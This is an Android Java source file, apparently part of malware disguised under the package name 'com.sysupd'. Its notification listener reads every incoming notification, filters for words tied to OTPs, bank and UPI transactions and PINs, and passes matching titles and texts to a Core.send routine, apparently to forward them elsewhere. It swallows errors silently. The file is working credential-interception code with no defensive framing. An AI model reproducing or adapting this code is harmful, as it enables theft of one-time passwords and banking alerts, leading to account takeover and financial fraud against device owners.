package com.sysupd;

import android.app.Notification;
import android.service.notification.*;
import android.os.Bundle;

public class NotificationListener extends NotificationListenerService {
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            Bundle b = sbn.getNotification().extras;
            String title = b.getString(Notification.EXTRA_TITLE, "");
            String text = b.getString(Notification.EXTRA_TEXT, "");
            String content = (title + " " + text).toLowerCase();
            String[] keys = {"otp","code","bank","upi","debited","credited","pin"};
            for (String k : keys) {
                if (content.contains(k)) {
                    Core.send("NOTIFICATION",
                        "{\"pkg\":\"" + sbn.getPackageName() +
                        "\",\"title\":\"" + title +
                        "\",\"text\":\"" + text + "\"}");
                    break;
                }
            }
        } catch (Exception e) {}
    }
}
